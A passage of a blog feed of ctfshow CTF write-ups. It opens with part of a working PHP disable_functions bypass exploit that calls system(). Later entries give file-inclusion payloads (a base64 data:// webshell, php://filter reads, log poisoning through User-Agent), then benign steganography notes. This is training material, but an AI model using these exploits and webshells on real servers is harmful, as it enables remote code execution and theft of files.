invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br><span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br><span class="hljs-variable">$closure_obj</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br><span class="hljs-variable">$binary_leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = <span class="hljs-title function_ invoke__">get_binary_base</span>(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = <span class="hljs-title function_ invoke__">parse_elf</span>(<span class="hljs-variable">$base</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = <span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>&#125;<br><br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>); <br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>); <br><br>(<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-keyword">exit</span>();<br><br>&#125;<br><br><span class="hljs-title function_ invoke__">ctfshow</span>(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020682.gif" alt="img"></p><h3 id="Web73"><a href="#Web73" class="headerlink" title="Web73"></a>Web73</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020884.gif" alt="img"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020022.gif" alt="img"></p><blockquote><p>还是glob遍历</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020067.gif" alt="img"></p><p>用上脚本发现strlen被ban了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020097.gif" alt="img"></p><blockquote><p>看其他师傅的wp include是没有被ban掉的 做题定向思维了 这应该是非预期解了</p></blockquote><h3 id="Web74"><a href="#Web74" class="headerlink" title="Web74"></a>Web74</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020282.gif" alt="img"> </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020339.gif" alt="img"></p><blockquote><p>和上一题一样</p></blockquote><h3 id="Web75"><a href="#Web75" class="headerlink" title="Web75"></a>Web75</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020432.gif" alt="img"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020507.gif" alt="img"></p><blockquote><p>这道题是用了pdo连接mysql操作方法 不是特别明白 先跳过</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含刷题</title>
    <link href="/2023/05/29/web/web4/"/>
    <url>/2023/05/29/web/web4/</url>
    
    <content type="html"><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301443215.png" alt="image-20230530144343183"></p><blockquote><p>文件包含常规题 考虑伪协议绕过 这道题没有啥过滤的直接读就行</p><p>payload：</p><p>（1）?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;（base64过后的&lt;?php eval($_POST[1]);）</p><p>POST ：1&#x3D;system(“cat * f *”);</p><p>（2）?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><h3 id="Web79"><a href="#Web79" class="headerlink" title="Web79"></a>Web79</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352058.png" alt="img"></p><blockquote><p>该题目意思是将php replace成？？？所以无法直接包含flag.php </p><p>这边可以使用data伪协议绕过</p></blockquote><blockquote><p>1.data协议</p></blockquote><blockquote><p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p></blockquote><blockquote><p>使用方法:data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)</p></blockquote><blockquote><p>data伪协议只有在php&lt;5.3且include&#x3D;on时可以写木马。</p></blockquote><blockquote><p>2.php伪协议：</p></blockquote><blockquote><p>需要开启allow_url_fopen的：php:&#x2F;&#x2F;input（post请求提交数据）、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory和php:&#x2F;&#x2F;temp</p></blockquote><blockquote><p>不需要开启allow_wrl_fopen的：php:&#x2F;&#x2F;filter 用于读取源码</p></blockquote><blockquote><p>经常使用的是php:&#x2F;&#x2F;filter 用于读取源码 和php:&#x2F;&#x2F;input 用于执行php代码</p></blockquote><h3 id="Web80"><a href="#Web80" class="headerlink" title="Web80"></a>Web80</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352092.png" alt="img"></p><blockquote><p>data 和 php 被过滤所以data和伪协议用不了</p></blockquote><blockquote><p>用包含日志文件方法 大概意思就是</p><p>1、日志的默认路径</p></blockquote><blockquote><p> &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log    &#x2F;&#x2F;apache+linux</p></blockquote><blockquote><p> nginx 日志文件在用户安装目录的logs目录下&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p></blockquote><blockquote><p>2、web中间件默认配置uoh文件</p></blockquote><blockquote><p>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf或index.php?page&#x3D;&#x2F;etc&#x2F;init.d&#x2F;httpd    &#x2F;&#x2F;apache+linux</p></blockquote><blockquote><p>C:&#x2F;Windows&#x2F;system32&#x2F;inetsrv&#x2F;metabase.xml     &#x2F;&#x2F;iis6.0+win2003</p></blockquote><blockquote><p>C:WindowsSystem32inetsrvconfigapplicationHost.config      &#x2F;&#x2F;iis7.0+win</p></blockquote><blockquote><p>3、利用</p></blockquote><blockquote><p> 方法1 访问</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://www.xx.com/</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">时，</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：</span><br></code></pre></td></tr></table></figure></blockquote><blockquote><p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log找到日志文件，并以php解析的方式打开</p></blockquote><blockquote><p>方法2 可以添加php语句 到user_agent（User Agent中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标 识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的 UA来判断的。）中</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301530825.png" alt="image-20230530153049671"></p><h3 id="Web81"><a href="#Web81" class="headerlink" title="Web81"></a>Web81</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352097.png" alt="img"></p><blockquote><p>多过滤了：不影响包含日志文件的尝试用上一题解决方法</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352122.png" alt="img"></p><blockquote><p>一般都是能够通过日志包含来写的</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc刷题（文件结构）</title>
    <link href="/2023/05/29/misc/misc2/"/>
    <url>/2023/05/29/misc/misc2/</url>
    
    <content type="html"><![CDATA[<h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><h3 id="misc24"><a href="#misc24" class="headerlink" title="misc24"></a>misc24</h3><blockquote><p>考察了bmp文件头和文件体</p></blockquote><blockquote><p><strong><a href="https://blog.csdn.net/whl0071/article/details/126976920">bmp文件详解</a></strong></p></blockquote><blockquote><p>bmp文件头是以位图格式：424d 然后其他的参数都是从后往前读的 具体看下图</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717695.jpg" alt="img"></p><blockquote><p>注意像素是文件体的字节数&#x2F;3 （三原色）像素也等于图像宽×图像高 这道题是图像的长×高不对，提示是<strong>flag<strong><strong>在图片上面。</strong></strong>宽是对的，根据像素推导高，然后在位图里改，最后导出就好</strong></p></blockquote><h3 id="misc25"><a href="#misc25" class="headerlink" title="misc25"></a>misc25</h3><blockquote><p>考察png文件格式</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717699.jpg" alt="img"></p><blockquote><p><strong>Png有crc校验</strong> </p></blockquote><blockquote><p>图片的<a href="https://so.csdn.net/so/search?q=crc%E6%A0%A1%E9%AA%8C&spm=1001.2101.3001.7020">crc校验</a>值由从第12个字节到第28个字节的十七位字节进行crc计算得到</p></blockquote><blockquote><p>所以拿到png图的题时应当先校验crc</p></blockquote><blockquote><p>49 48 44 52 00 00 03 84 00 00 00 96 08 02 00 00 00</p></blockquote><blockquote><p>这里使用脚本去根据crc校验值去爆破图像的宽高(脚本都在test.py中)</p></blockquote><h3 id="misc26"><a href="#misc26" class="headerlink" title="misc26"></a>misc26</h3><blockquote><p>Png文件同25题去跑脚本</p></blockquote><h3 id="misc27"><a href="#misc27" class="headerlink" title="misc27"></a>misc27</h3><blockquote><p>考点时jpg文件格式 这个参考</p></blockquote><blockquote><p><strong><a href="https://blog.csdn.net/weixin_40673765/article/details/118786341">jpg文件格式</a></strong>               <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717712.gif" alt="img"></p></blockquote><blockquote><p>Jpg文件宽高是在4中 所以需要修改宽高时可以直接查找FFC0 6-7位是高 8-9位是宽</p></blockquote><blockquote><p>当什么提示flag在下面上面就修改高 宽看题目意思修改</p></blockquote><blockquote><p><em><strong>Jpg的宽高是先高后宽</strong></em> </p></blockquote><blockquote><p>在第四块区域中0008 0008 是高和宽 注意要倒着看</p></blockquote><h3 id="misc28"><a href="#misc28" class="headerlink" title="misc28"></a>misc28</h3><blockquote><p><a href="https://www.jianshu.com/p/4fabac6b15b3">GIF 字节格式</a></p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717050.gif" alt="img"></p><blockquote><p>474946383961 文件头后是宽高 </p></blockquote><blockquote><p><strong>注意点</strong> 还有 Image Seperator里的下一帧宽高也需要改</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717123.gif" alt="img"></p><blockquote><p>这里插一句 gif动图是一帧一帧图片结合起来的 所以每一帧动图都会有Graphics Control Extension 和 Image Descriptor 9021 F9 04 01 32 00 02 00 2C 00 00 00 00 84 03 96 00 87</p></blockquote><blockquote><p>所以呢 改图片需要将整合图片的宽高和每一帧的宽高都要一起改</p></blockquote><blockquote><p>我直接搜索相同宽高一起改就完事了（跟bmp图片文件一样 宽高是倒的 倒着读就行）</p></blockquote><blockquote><p>这里引入stegsolve 图片查看器 </p></blockquote><h3 id="misc29"><a href="#misc29" class="headerlink" title="misc29"></a>misc29</h3><blockquote><p>也是gif文件格式 根据题目修改高 记得每一帧的高都要修改</p></blockquote><blockquote><p>保存以后发现是一张动图，这里就用到了stegsolve工具 analyse模块中frame browser （动图帧格式预览）一帧一帧查看 就获得了 </p></blockquote><h3 id="misc30"><a href="#misc30" class="headerlink" title="misc30"></a>misc30</h3><blockquote><p>还是bmp图片格式 所以按照题目要求修改 宽度950 （3B6）就行 注意得倒着写</p></blockquote><h3 id="misc31"><a href="#misc31" class="headerlink" title="misc31"></a>misc31</h3><blockquote><p>Bmp图片格式 按照要求高度是对的 修改宽度 根据字节数手搓宽度 注意字节数得除以3才得到像素，因为三原色 但是求解的宽度不是整数需要向下取整</p></blockquote><h3 id="misc32"><a href="#misc32" class="headerlink" title="misc32"></a>misc32</h3><blockquote><p>考察了png 的crc检验 把文件放到脚本里去跑得出宽和高</p></blockquote><h3 id="misc33"><a href="#misc33" class="headerlink" title="misc33"></a>misc33</h3><blockquote><p>和上题一样 跑脚本</p></blockquote><h3 id="misc34"><a href="#misc34" class="headerlink" title="misc34"></a>misc34</h3><blockquote><p>根据提示用脚本遍历宽度就行 </p></blockquote><h3 id="miscc35"><a href="#miscc35" class="headerlink" title="miscc35"></a>miscc35</h3><blockquote><p>不能理解为什么高度也会被改掉</p></blockquote><blockquote><p>那么既然改了为什么高度是600</p></blockquote><blockquote><p>那如果遍历高度和宽度呢</p></blockquote><blockquote><p>发现数据量过于庞大 然后上网搜了下 如何批量检测损坏文件</p></blockquote><blockquote><p>引入imghdr库 但是跑出来的甚至是修改好的 也是被检测出来是损坏的 本来题目给的就是损坏文件</p></blockquote><p>这道题</p><p>这边跑脚本的时候注意 宽高所占的字节数 一个十六进制字母占到0.5个字节 一般这个位置是2-4个字节 如果2个字节的话要用短整型（h） 如果4个字节的话要用整型（i）struct.pack(‘&gt;h’,i)如果像bmp是倒着写的可以[::-1]</p><h3 id="misc36"><a href="#misc36" class="headerlink" title="misc36"></a>misc36</h3><blockquote><p>和上一道同理，如果出现有图像但是不是所需要的图像可以考虑改大图片的高，或许就有用呢，一般高度改了确实能隐藏，跑的脚本在文件下。</p></blockquote><h3 id="misc37"><a href="#misc37" class="headerlink" title="misc37"></a>misc37</h3><blockquote><p>打开文件是发现是动图，提示也是flag在图片里所以gif一张一张分离，用stegsolve analyse frame browser ctfshow{2056782cd57b13261dcbbe3d6eecda17}</p></blockquote><h3 id="misc38"><a href="#misc38" class="headerlink" title="misc38"></a>misc38</h3><blockquote><p>提示是还是flag在图片里，打开后发现是个png文件，看了wp以后才知道这个提示是要先png转到gif格式  工具<a href="https://cdkm.com/cn/png-to-gif">png转gif工具</a> 然后和上一题同样操作就行了</p></blockquote><p>ctfshow{48b722b570c603ef58cc0b83bbf7680d}</p><blockquote><p>使用apngdis.exe（APNG Disassembler）工具分离文件也可</p></blockquote><h3 id="misc39"><a href="#misc39" class="headerlink" title="misc39"></a>misc39</h3><blockquote><p>提示是flag如流水，图片帧间隔时间隐写，identify -format “%T “ misc39.gif &gt; 1.txt</p></blockquote><blockquote><p>这个实在看不懂了网上找吧</p></blockquote><blockquote><p>flag一般是32位的加上格式是41位，</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291717268.gif" alt="img"></p><blockquote><p>可以看到3637循环，可以想到01二进制循环，第一位是37 所以37为1，36为0</p></blockquote><blockquote><p>转化为287，287 &#x2F;41&#x3D;7 所以7位为一组，转化字符串类型 然后flag就是转化后的字符串</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc刷题（信息附加）</title>
    <link href="/2023/05/26/misc/misc1/"/>
    <url>/2023/05/26/misc/misc1/</url>
    
    <content type="html"><![CDATA[<h1 id="misc刷题（信息附加）"><a href="#misc刷题（信息附加）" class="headerlink" title="misc刷题（信息附加）"></a>misc刷题（信息附加）</h1><h2 id="信息附加"><a href="#信息附加" class="headerlink" title="信息附加"></a>信息附加</h2><h3 id="Misc3"><a href="#Misc3" class="headerlink" title="Misc3"></a>Misc3</h3><blockquote><p>Bpgview.exe 的使用 当文件后缀是bpg使用</p></blockquote><blockquote><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251822927.png" style="zoom:50%;" /></blockquote><h3 id="misc5"><a href="#misc5" class="headerlink" title="misc5"></a>misc5</h3><blockquote><p>图片隐写</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825792.png"></p></blockquote><h3 id="misc6"><a href="#misc6" class="headerlink" title="misc6"></a>misc6</h3><p>同理</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825010.png"></p><h3 id="misc7"><a href="#misc7" class="headerlink" title="misc7"></a>misc7</h3><blockquote><p>同理 不放照片了</p></blockquote><h3 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h3><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251825199.png"></p><blockquote><p>使用foremost分离图片</p></blockquote><blockquote><p>方法<a href="https://blog.csdn.net/john_david_/article/details/87273152">foremost使用简介</a></p></blockquote><h3 id="misc9"><a href="#misc9" class="headerlink" title="misc9"></a>misc9</h3><blockquote><p>用winhex查找</p></blockquote><h3 id="misc10"><a href="#misc10" class="headerlink" title="misc10"></a>misc10</h3><blockquote><p>图片文件的分离</p></blockquote><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826495.png"><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251826104.png"></p><blockquote><p>根据提示搞 要将runas&#x3D;root</p></blockquote><h3 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h3><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251827268.png" alt="image-20230525182748221"></p><blockquote><p>利用tweakpng 对png文件idat（数据）对图片内容改写</p></blockquote><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828423.png" alt="image-20230525182805387"></p><blockquote><p>删除不同的数据块所获得的内容也不同</p></blockquote><h3 id="misc12"><a href="#misc12" class="headerlink" title="misc12"></a>misc12</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828925.png" alt="image-20230525182820884"></p><blockquote><p>按f7预览</p></blockquote><blockquote><p>从头逐个删除idat直至出现</p></blockquote><blockquote><p>具体原因不清楚   idat的length应该是一样的 常规删除不一样的</p></blockquote><h3 id="misc13"><a href="#misc13" class="headerlink" title="misc13"></a>misc13</h3><blockquote><p>抽象的题目</p></blockquote><blockquote><p>图片用winhex打开图片 发现有类似flag的东西？</p></blockquote><blockquote><p>  然后分析一个间隔一个的出现</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251828483.png" alt="image-20230525182858447"></p></blockquote><blockquote><p>那么将十六进制转化为byte类型再用切片提取flag</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829795.png" alt="image-20230525182939765"> </p><h3 id="misc14"><a href="#misc14" class="headerlink" title="misc14"></a>misc14</h3><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305251829665.png" alt="image-20230525182953629"></p><blockquote><p>Binwalk查看整个文件的块内容</p></blockquote><blockquote><p>可以发现发现 有四个文件块 </p></blockquote><blockquote><p>用dd命令进行分解 dd if&#x3D;源文件 of&#x3D;输出文件 skip&#x3D;跳过的大小 count&#x3D;提取文件的大小 bs&#x3D;块大小 这边DECIMAL 是指的上一个文件的大小</p></blockquote><blockquote><p>应该先查看文件的类型然后 对对应的文件进行分离</p></blockquote><h3 id="misc15"><a href="#misc15" class="headerlink" title="misc15"></a>misc15</h3><blockquote><p>用winhex查找</p></blockquote><p> 无图.jpg</p><h3 id="misc16"><a href="#misc16" class="headerlink" title="misc16"></a>misc16</h3><blockquote><p>用binwalk进行分离 得到文件夹下里面寻找</p></blockquote><p> 再次无图.jpg</p><h3 id="misc17"><a href="#misc17" class="headerlink" title="misc17"></a>misc17</h3><blockquote><p>新工具的使用 zsteg 此工具可以对png 和bmp文件中隐写的数据进行分离 </p></blockquote><blockquote><p><a href="https://blog.csdn.net/weixin_52941926/article/details/121536324">zsteg使用方法</a></p></blockquote><blockquote><p>建议以后如果不会好好看</p></blockquote><blockquote><p>可以先使用zsteg &lt;文件名&gt; –all 查看所有组合</p></blockquote><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612400.png" alt="image-20230526161238348"></p><blockquote><p>这边发现是只有extradata:0模式下有隐藏内容</p></blockquote><blockquote><p>所以对此进行分离</p></blockquote><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261612289.png" alt="image-20230526161256254"></p><blockquote><p>然后打开发现是乱码 然后就查答案 发现可以binwalk再次进行分离</p></blockquote><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305261613849.png" alt="image-20230526161300816"></p><blockquote><p>然后就分离出来了 </p></blockquote><h3 id="misc18"><a href="#misc18" class="headerlink" title="misc18"></a>misc18</h3><blockquote><p>藏在详细信息里</p></blockquote><p><img src="C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230529165153643.png" alt="image-20230529165153643"> </p><blockquote><p>就没啥好说的，多留意就行</p></blockquote><h3 id="misc19"><a href="#misc19" class="headerlink" title="misc19"></a>misc19</h3><blockquote><p>使用新工具exiftool查看图片的详细内容 </p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291653062.png" alt="image-20230529165312013"></p><blockquote><p>使用exiftool能看到一些隐藏的参数，所以这道隐写题 将flag放于document name 和host nname中</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655788.png" alt="image-20230529165521755"></p><blockquote><p>那么同理 18题的也可以用这个工具查看</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655301.png" alt="image-20230529165534249"> </p><h3 id="misc20"><a href="#misc20" class="headerlink" title="misc20"></a>misc20</h3><blockquote><p>还是用exiftool查看文件信息</p></blockquote><blockquote><p>发现在comment里有文字隐写</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291655652.png" alt="image-20230529165555621"></p><h3 id="misc21"><a href="#misc21" class="headerlink" title="misc21"></a>misc21<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291656458.png" alt="image-20230529165632408"></h3><blockquote><p>题目给出的提示是要在序号里找</p></blockquote><blockquote><p>但是唯一一个serial number很显然不符合flag格式</p></blockquote><blockquote><p>这时发现有四段xy信息是一串长度相同的数字</p></blockquote><blockquote><p>第一个想法就是连起来然后去拿十六进制，但是不对，后来尝试一段一段转化就得到了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659679.png" alt="image-20230529165900646"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659067.png" alt="image-20230529165926034"></p></blockquote><h3 id="misc22"><a href="#misc22" class="headerlink" title="misc22"></a>misc22<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291659871.png" alt="image-20230529165931825"></h3><blockquote><p>这道题是先用exiftool查看文件信息</p></blockquote><blockquote><p>发现最后一行有thumbnail image 代表这张图片是有缩略图的</p></blockquote><blockquote><p>使用命令进行分离缩略图</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291700576.png" alt="image-20230529170045544"></p><blockquote><p><a href="https://www.32r.com/soft/86104.html">如果不懂exiftool有啥参数能用看这</a></p></blockquote><blockquote><p>另一个方法</p></blockquote><blockquote><p>使用magicexif也能直接查看缩略图信息</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291701026.png" alt="image-20230529170140988"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702455.png" alt="image-20230529170201419"></p><h3 id="misc23"><a href="#misc23" class="headerlink" title="misc23"></a>misc23</h3><blockquote><p>这道题涉及了时间戳隐写</p></blockquote><blockquote><p>首先exiftool查看文件的具体信息，发现多了四个时间信息，而且这个时间信息非常异常，不符合正常逻辑，所以得想到时间戳隐写</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702431.png" alt="image-20230529170207389"></p><blockquote><p>时间戳是1970年的一月一日到所在时间的总秒数所以求出四个时间戳然后hex得到其flag值</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291702878.png" alt="image-20230529170218838"></p><p>41</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305291704315.png" alt="image-20230529170425260"></p><p>这道题就是十六进制结合了图像隐写，将flag值隐藏于f001 组合的图像中</p><p>属于长见识的一道题</p><h2 id="信息附加的总结："><a href="#信息附加的总结：" class="headerlink" title="信息附加的总结："></a>信息附加的总结：</h2><blockquote><p>做这类题目时首先查看文件类型，通过一些特殊的文件打开器打开 例如bpg文件可以用bpgview.exe打开  如果能直接打开最好，一些就是直接放在图片里的，当然这种情况虽少但不是没有。补充，有的照片会藏在缩略图里了，在exiftool查看时会告诉，当然也可以用exif元图片查看器查看。</p></blockquote><blockquote><p>   其次，查看文件的详细属性，这里可以Windows下直接在属性里看，当然也可用linux里的exiftool 直接查看，这边推荐直接用第二种方式 直接，方便。此步骤是看看详细内容中有没有一些信息，留意一些奇奇怪怪的属性，比如啥照片会有xy坐标信息的，啥照片会有奇奇怪怪的时间戳的，留意就行。</p></blockquote><blockquote><p>​然后就是对文件内容进行查看了，常规就是拖入winhex或者010editor查看 当然也可以在linux用hexdump命令查看，有的是会放在ASCII码中，有的就会放在16进制编码中，比如就像愚人节那道题41，常规先ctrl +F搜索一遍，加上对一些文件头文件尾进行查询，如果有那么要进行分离，这边可以foremost文件分离，或者使用binwalk+dd命令进行分离。这里补充binwalk查看的是文件块，就是文件头到文件尾的那种，对于png图片文件，也可以用tweakpng，这类题目一般是对图片idat块增加删除，从而改变图片文件，开F7预览从上至下删除idat文件块就行。</p></blockquote><blockquote><p>对于文件隐写，直接用zsteg检测就完事了，会给出隐写内容</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>r18</title>
    <link href="/2020/01/01/1/"/>
    <url>/2020/01/01/1/</url>
    
